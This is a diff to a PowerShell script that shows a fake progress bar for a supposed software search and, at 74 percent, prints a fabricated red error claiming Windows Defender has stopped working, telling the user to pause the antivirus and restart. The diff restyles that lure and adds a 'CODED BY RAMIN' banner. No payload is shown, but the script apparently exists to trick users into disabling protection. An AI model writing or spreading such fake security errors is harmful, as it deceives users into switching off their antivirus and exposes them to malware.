@@ -3,7 +3,9 @@ function Show-Progress {
     param (
         [int]$PercentComplete
     )
-    
+    Write-Host "Начат поиск П.О"
+    Write-Host "CODED BY RAMIN" -ForegroundColor DarkGreen -BackgroundColor White
+
     $progressBarLength = 50  # Длина визуального индикатора
     $filledLength = [math]::Round(($PercentComplete / 100) * $progressBarLength)
 
@@ -22,9 +24,11 @@ for ($i = 0; $i -le 100; $i++) {
     
     if ($i -eq 74) {
         Show-Progress 74
-        Write-Host "ERROR=ERROR=ERROR=ERROR=ERROR=ERROR=ERROR"
-        Write-Host "Expression evaluation error at function 'reject' [line 257]: Windows Defender has stopped working. Access error."
-        Write-Host "Try pausing the antivirus for a while and restarting the file search."
+        Write-Host "========================================================================================================================================================"
+        Write-Host "ERROR=ERROR=ERROR=ERROR=ERROR=ERROR=ERROR" -ForegroundColor red -BackgroundColor black
+
+        Write-Host "Expression evaluation error at function 'reject' [line 257]: Windows Defender has stopped working. Access error." -ForegroundColor red -BackgroundColor black
+        Write-Host "Try pausing the antivirus for a while and restarting the file search." -ForegroundColor red -BackgroundColor black
         break
     }
 
